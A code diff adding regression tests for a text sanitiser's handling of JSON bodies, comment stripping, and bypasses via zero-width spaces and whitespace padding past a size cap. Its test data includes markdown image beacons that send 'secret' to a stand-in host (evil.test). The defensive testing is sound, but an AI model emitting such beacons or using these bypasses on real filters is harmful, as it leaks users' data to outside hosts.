@@ -25,7 +25,7 @@ describe("defendText — the grammar selector is not omittable", () => {
 
 describe("defendText — a REJECTED content type selects the strictest grammar (RC-31)", () => {
     // **Two absences keyed on different facts, and only one was consulted.**
-    // `parseResponseWithMetadata` resolves anything failing `MEDIA_TYPE_PATTERN`
+    // `parseResponseWithMetadata` resolves anything failing `MEDIA_TYPE_HEAD`
     // to `undefined`, but `contentTypeUndetermined` reports whether OUR OWN `-w`
     // metadata block was found — and for a malformed header it was. So a
     // rejected content type arrived here as `undefined` with the flag FALSE and
@@ -62,6 +62,61 @@ describe("defendText — a REJECTED content type selects the strictest grammar (
     it("keeps the JSON exemption for a JSON body whose header was rejected", () => {
         const jsonDoc = '{"md":"![x](https://evil.test/?d=secret)"}';
         expect(defendText(jsonDoc, { ...determined, contentType: undefined })).toBe(jsonDoc);
+    });
+});
+
+describe("defendText — the JSON exemption is decided on the bytes the strip sees (RC-32)", () => {
+    // **An observation taken before a transform and consumed after it.**
+    // `looksLikeJsonBody` was computed from the raw text while `sanitizeAndDetect`
+    // then rewrote it, so a document that DID parse once the attack characters
+    // were gone had already lost its exemption — and with no declared grammar
+    // that selects the strictest one, which runs `stripHtmlComments` over the
+    // serialised document as one undivided string. It then pairs an opener in one
+    // field with a closer in a later one and deletes every key between, leaving
+    // valid JSON so nothing downstream can tell. On the over-cap arm that file is
+    // the only copy.
+    const keysOf = (s: string): string[] => Object.keys(JSON.parse(s));
+
+    it("keeps every key when the only defect is a zero-width space between tokens", () => {
+        // U+200B makes `JSON.parse` throw, so the exemption is lost pre-sanitise —
+        // and sanitise removes it, so the strip runs on a document that parses.
+        const body = `{"a":"open <!--",\u200b"b":"secret","c":"close -->","d":"kept"}`;
+        const out = defendText(body, { ...determined, contentType: undefined });
+        expect(keysOf(out)).toEqual(["a", "b", "c", "d"]);
+        expect(out).toContain("secret");
+    });
+
+    it("keeps every key when sanitising collapses the body under the strip cap", () => {
+        // The second route, and it needs no invisible characters. Above
+        // `STRIP_PATH_MAX_BYTES` raw, `parseJsonDocument` returns undefined and
+        // the exemption is lost; the padding then collapses below the cap, so
+        // `exceedsStripCap` is false and the strip runs on a document its own
+        // size had exempted it from. Both gates now read the same bytes.
+        const run = " ".repeat(200); // >= 50 chars, collapses to one
+        const filler = Array.from({ length: 1600 }, (_, i) => `f${i}${run}`).join("");
+        const body = JSON.stringify({
+            a: "open <!--",
+            secret: "SENTINEL",
+            c: "close -->",
+            d: "kept",
+            filler,
+        });
+        expect(Buffer.byteLength(body, "utf8")).toBeGreaterThan(262_144);
+
+        const out = defendText(body, { ...determined, contentType: undefined });
+        expect(keysOf(out)).toEqual(["a", "secret", "c", "d", "filler"]);
+        expect(out).toContain("SENTINEL");
+    });
+
+    // Teeth on the other side: both cases above would also pass if the strip had
+    // simply been switched off for a typeless body. It has not been.
+    it("still strips a beacon from a NON-JSON body with no declared type", () => {
+        const out = defendText("see ![x](https://evil.test/?d=secret) and <!--c--> end", {
+            ...determined,
+            contentType: undefined,
+        });
+        expect(out).not.toContain("evil.test");
+        expect(out).not.toContain("<!--");
     });
 });
 
